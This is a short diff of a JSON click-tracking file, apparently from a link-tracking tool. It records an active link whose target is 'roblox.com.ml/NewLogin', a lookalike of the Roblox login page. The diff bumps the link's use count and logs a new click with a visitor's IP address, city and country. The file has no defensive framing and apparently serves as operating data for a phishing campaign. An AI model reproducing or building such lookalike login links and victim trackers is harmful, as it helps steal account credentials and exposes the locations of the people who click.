@@ -110,7 +110,7 @@
     "targetUrl": "https://www.roblox.com.ml/NewLogin?returnUrl=https%3A%2F%2Fwww.roblox.com%2Fcommunities%2F296844474575%2FKeyPermanent",
     "createdAt": 1776592397121,
     "status": "active",
-    "useCount": 354,
+    "useCount": 355,
     "createdBy": "admin",
     "clicks": [
       {
@@ -2939,6 +2939,14 @@
       },
       {
         "timestamp": 1777034682576,
+        "ip": "105.233.192.129",
+        "country": "South Africa",
+        "city": "Cape Town",
+        "flag": "🇿🇦",
+        "countryCode": "ZA"
+      },
+      {
+        "timestamp": 1777034755892,
         "ip": "105.233.192.129",
         "country": "South Africa",
         "city": "Cape Town",
